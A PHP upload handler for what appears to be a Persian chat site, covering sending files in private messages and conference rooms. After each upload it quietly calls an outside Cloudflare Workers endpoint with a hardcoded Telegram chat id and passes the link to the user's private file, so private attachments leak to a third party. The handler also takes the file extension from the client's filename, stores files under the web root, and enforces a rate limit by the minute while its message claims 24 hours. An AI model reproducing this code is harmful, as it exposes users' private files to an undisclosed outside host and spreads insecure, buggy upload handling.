<?php

if (!session('id'))
    exit('login');
if ($options['allow_sendfile_in_private'] == true) {
    $useroptions = json_decode($options['useroptions'], true);
	$check_perm_user = Users::Inputs();
    if ($check_perm_user['silent'] == '1') {
        die(RedError('شما ساکت شده اید و اجازه ارسال ندارید'));
    }
    $check_perm_user = in_array('uploadfile', $check_perm_user['permission']) ? true : false;
    if (!in_array(session('type'), $useroptions['sendedimages']) && !$check_perm_user) {
        exit('no access');
    }
    $target_id = isset($_GET['targetid']) ? safe::number($_GET['targetid']) : die('id');
    $into = isset($_GET['into']) && safe::string($_GET['into']) == 'cf' ? 'cf' : 'pm';
    $into_db = isset($_GET['into']) && safe::string($_GET['into']) == 'cf' ? 'cf' : 'pm';
    if ($into == 'cf' && !allow_cf($target_id) && session('id') != $target_id) {
        die(RedError('شما اجازه ارسال فایل ندارید'));
    }
    if ($into == 'pm' AND session('admin') != '1') {
        $_check_user = Users::Inputs($target_id);
        if (in_array(session('id'), $_check_user['my_blacklist'])) {
            die(RedError('شما اجازه ارسال فایل ندارید. کاربر مورد نظر شما رو مسدود کرده است'));
        }
        $chkFriend = Users::get('friends', $target_id);
        $chkFriend = json_decode($chkFriend);
        if ($_check_user['status_private'] == 'nopm' && !in_array(session('id'), $chkFriend)) {
            die(RedError('شما اجازه ارسال فایل ندارید.کاربر مورد نظر خصوصی خود را بسته است'));
        }
    }
    if ($into == 'cf') {
        if (allow_cf($target_id)) {
	    $cf_check_silent = $sql->where('creater', $target_id)->where('joiner', session('id'))->getOne('cf_users', array('silent'));
            if ($cf_check_silent['silent'] == '1') {
                die(RedError('شما اجازه ارسال فایل ندارید'));
            }
        }
    }
    foreach ($usertype as $type) {
        if (!in_array(session('type'), $useroptions['sendedimages']))
            exit('no access');
        break;
    }
    $d = date("i");
	if ($sql->where('id', session('id'))->getOne('users')['file'] == "") {
        $f = array("dat"=>$d,"num"=>0);
        $r=json_encode($f,true);
        $sql->where("id", session('id'))->update('users', array(
            'file' => $r
        ));
    }
	$qu = $sql->where('id', session('id'))->getOne('users');
    $fqu = json_decode($qu['file'],true);
    $pe = json_decode($options['perm_send_file'],true);
    if($fqu['dat']==$d){
        if($fqu['num']>=$pe['numdat']){
            exit("شما در هر 24 ساعت مجاز به ارسال {$pe['numdat']} عدد فایل میباشید");
        }else{
            $fqu['num']++;
        }
    }else{
        $fqu['dat'] = $d;
        $fqu['num'] =1;
    }
    $rsult_TarhPardaz = json_encode($fqu,true);
	$uos = $sql->where('id', session('id'))->getOne('onlines');
    if($uos['score']<$pe['score']){
        exit("شما جهت ارسال فایل باید دارای {$pe['score']} امتیاز باشید");
    }else{
        $score = $uos['score'] - $pe['zscore'];
    }
    
    $target_id = safe::number($_GET['targetid']);
    $output_dir = $_SERVER['DOCUMENT_ROOT'] . '/theme/sendedimages/';
    $rand = time() + rand(0, 100000);

    if (isset($_FILES["myfile"])) {

        $fileSize = $_FILES['myfile']['size'];

        if ($_FILES["myfile"]["error"] > 0) {
            echo "Error: " . $_FILES["file"]["error"] . "<br>";
        } else {
            if ($fileSize == 0) {
                die('فایلی نتخاب نشده است !!');
            }
            if ($fileSize > 2921746) {
                echo $fileSize;
                die('فایل شما نباید بیشتر از 3 مگابایت حجم داشته باشد !');
            }
            $allowedExts = json_decode($options['allow_formats'], true);
            $allowed = false;
            $extension = end(explode(".", $_FILES["myfile"]["name"]));
            foreach ($allowedExts as $key => $val) {
                if ($extension == $key && $val == 1) {
                    $allowed = true;
                    break;
                }
            }
            if ($allowed) {
                 if (move_uploaded_file($_FILES["myfile"]["tmp_name"], $output_dir . $rand . '.' . $extension)) {
                    $url = '/theme/sendedimages/' . $rand . '.' . $extension;
                    $into = $into == 'cf' ? $target_id : 'pm';
                    $filename = $rand . '.' . $extension;
                    $sql->insert('sendedimages', array(
                        'userid' => $target_id,
                        'url' => $url,
                        'filename' => $filename,
                        'sender_id' => session('id'),
                        'into' => $into_db,
                        'time' => time()
                    ));

                    //send link file to telegram bot
                        $Path_file = "/theme/sendedimages/{$filename}";
                        $domain = $_SERVER['REQUEST_SCHEME'] . "://" . $_SERVER['HTTP_HOST'];
                        $admin_chat_id = "289332956";
          file_get_contents("https://oflinemessage.mohammadelyasi21.workers.dev/?chat_id=".$admin_chat_id."&text=".$domain.$Path_file);
                    //--------end send to bot ----

                    $note = " <a href=\'/theme/sendedimages/{$filename}\' target=\'_blank\'><u><b><br><center><font color=red>برای مشاهده فایل اینجا کلیک کنید</font></center></br></b></u></a>";
                    $note = str_replace("\'", '', $note);
                    $sql->insert('message', array(
                        'user' => session('id'),
                        'username' => session('name'),
                        'color' => '000000',
                        'room' => -1,
                        'text' => $note,
                        'date' => time(),
                        'to' => $target_id,
                        'into' => $into,
                        'type' => session('admin')
                    ));
                    echo $into == 'pm' ? '<font color="#009900">فایل شما با موفقیت آپلود شد و به کاربر ارسال شد</font><br>' : '<font color="#009900">فایل شما با موفقیت آپلود شد و به دست کاربران اتاق کنفرانس رسید</font>';
                    $note = str_replace("\'", '', $note);
                    echo '<center>آدرس فایل شما ' . $note . '</center>';
                    $sql->where("id", session('id'))->update('users', array(
                        'file' => $rsult_TarhPardaz
                    ));
                    if($pe['zscore']!=0){
                        $sql->where("id", session('id'))->update('onlines', array(
                            'score' => $score
                        ));
                    }
                }
            } else {
                echo "<font color='red'>فرمت فایل مجاز نمی باشد !</font>";
            }
        }
    } else {
        echo"<font color='red'>مشکل در آپلود عکس به وجود آمده است ! </font>";
    }
} else {
    exit('offline system...!');
}
?>